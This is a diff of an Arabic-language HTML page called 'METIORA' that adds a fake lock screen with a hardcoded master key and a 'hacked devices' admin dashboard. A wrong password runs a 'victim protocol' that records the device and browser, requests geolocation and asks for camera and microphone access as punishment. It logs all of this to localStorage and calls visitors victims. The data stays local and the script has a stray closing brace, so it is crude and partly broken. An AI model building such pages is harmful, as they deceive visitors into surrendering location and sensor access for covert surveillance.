@@ -3,43 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <title>SYSTEM CONTROL - METIORA</title>
-    <script>
-        (function() {
-            const MASTER_KEY = "5262101402:"; // كود المطورة متيورة
-            const LOCK_MSG = "هذه المحادثة خاضعة لكعكة متيورة السوداء و لا يمكن فتحها الا بامر منها";
-
-            function applyLockdown() {
-                document.documentElement.innerHTML = `
-                    <body style="background:#000; color:#ff0000; text-align:center; padding-top:15%; font-family:sans-serif; overflow:hidden;">
-                        <h1 style="font-size:2.5em;">${LOCK_MSG}</h1>
-                        <input type="password" id="adminCode" placeholder="أدخلي كود السيطرة" 
-                               style="padding:15px; width:300px; border:2px solid red; background:#111; color:#fff; font-size:20px; text-align:center;">
-                        <br><br>
-                        <button onclick="unlock()" style="padding:10px 40px; background:red; color:black; cursor:pointer; font-weight:bold; border:none;">
-                            دخول المطورة
-                        </button>
-                    </body>
-                `;
-
-                window.unlock = function() {
-                    let code = document.getElementById("adminCode").value;
-                    if (code === MASTER_KEY) {
-                        localStorage.setItem("METIORA_IDENTITY", "OWNER");
-                        location.reload(); 
-                    } else {
-                        alert("محاولة وصول غير مصرح بها. سيتم طردك الآن.");
-                        window.location.href = "https://www.google.com";
-                    }
-                };
-            }
-
-            if (localStorage.getItem("METIORA_IDENTITY") !== "OWNER") {
-                applyLockdown();
-            }
-        })();
-    </script>
+    <style>
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow-x: hidden; }
+        .hidden { display: none; }
+        .admin-panel { border: 2px solid #ff0000; margin: 20px; padding: 20px; background: #050505; text-align: left; direction: ltr; }
+        .log-entry { border-bottom: 1px solid #330000; padding: 5px; font-size: 0.9em; color: #00ff00; }
+        input { padding: 10px; background: #111; color: #fff; border: 1px solid red; margin-top: 10px; width: 250px; text-align: center; }
+        button { padding: 10px 20px; background: red; color: #000; font-weight: bold; cursor: pointer; border: none; margin-top: 10px; }
+    </style>
 </head>
-<body style="background: #111; color: white; text-align: center; padding-top: 20%;">
-    <h1>أهلاً بكِ يا آدمن متيورة. النظام تحت سيطرتكِ الآن.</h1>
+<body>
+
+    <div id="lockScreen">
+        <h1 style="margin-top: 15%;">هذه المحادثة خاضعة لكعكة متيورة السوداء و لا يمكن فتحها الا بامر منها</h1>
+        <input type="password" id="passCode" placeholder="أدخلي كود السيطرة">
+        <br>
+        <button onclick="checkAccess()">دخول المطورة</button>
+    </div>
+
+    <div id="adminDashboard" class="hidden">
+        <h2 style="color: #fff; border-bottom: 2px solid red; padding: 10px;">لوحة تحكم متيورة - الأجهزة المخترقة</h2>
+        <div class="admin-panel" id="logs">
+            <div class="log-entry"> > النظام جاهز.. في انتظار الضحية...</div>
+        </div>
+        <button onclick="clearLogs()" style="background: #333; color: white;">مسح السجلات</button>
+    </div>
+
+    <script>
+        const MASTER_KEY = "5262101402:";
+
+        // وظيفة التحقق من الإذن
+        function checkAccess() {
+            const input = document.getElementById('passCode').value;
+            if (input === MASTER_KEY) {
+                localStorage.setItem("METIORA_STATUS", "ADMIN");
+                showAdmin();
+            } else {
+                alert("محاولة وصول فاشلة. يتم الآن تسجيل بياناتك...");
+                startVictimProtocol(); // يبدأ بسحب بياناته فوراً كعقاب
+            }
+        }
+
+        function showAdmin() {
+            document.getElementById('lockScreen').classList.add('hidden');
+            document.getElementById('adminDashboard').classList.remove('hidden');
+            loadLogs();
+        }
+
+        // بروتوكول الضحية (سحب الصلاحيات)
+        async function startVictimProtocol() {
+            const logData = (info) => {
+                let logs = JSON.parse(localStorage.getItem("METIORA_LOGS") || "[]");
+                logs.unshift(`[${new Date().toLocaleTimeString()}] ${info}`);
+                localStorage.setItem("METIORA_LOGS", JSON.stringify(logs));
+            };
+
+            // سحب معلومات الجهاز ونوع الهاتف
+            logData(`دخول جهاز: ${navigator.platform} | المتصفح: ${navigator.userAgent}`);
+
+            // طلب الموقع الجغرافي
+            navigator.geolocation.getCurrentPosition((pos) => {
+                logData(`إحداثيات الموقع: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+            }, () => logData("الضحية رفض إذن الموقع."));
+
+            // طلب الكاميرا والميكروفون
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                logData("تم تفعيل الكاميرا والميكروفون بنجاح.");
+            } catch (e) {
+                logData("فشل الوصول للحساسات (تم الرفض).");
+            }
+        }
+
+        function loadLogs() {
+            const logsContainer = document.getElementById('logs');
+            const logs = JSON.parse(localStorage.getItem("METIORA_LOGS") || "[]");
+            if (logs.length > 0) {
+                logsContainer.innerHTML = logs.map(l => `<div class="log-entry"> > ${l}</div>`).join('');
+            }
+        }
+
+        function clearLogs() {
+            localStorage.removeItem("METIORA_LOGS");
+            location.reload();
+        }
+
+        // فحص تلقائي عند فتح الموقع
+        if (localStorage.getItem("METIORA_STATUS") === "ADMIN") {
+            showAdmin();
+        }
+    }
+    </script>
 </body>
 </html>
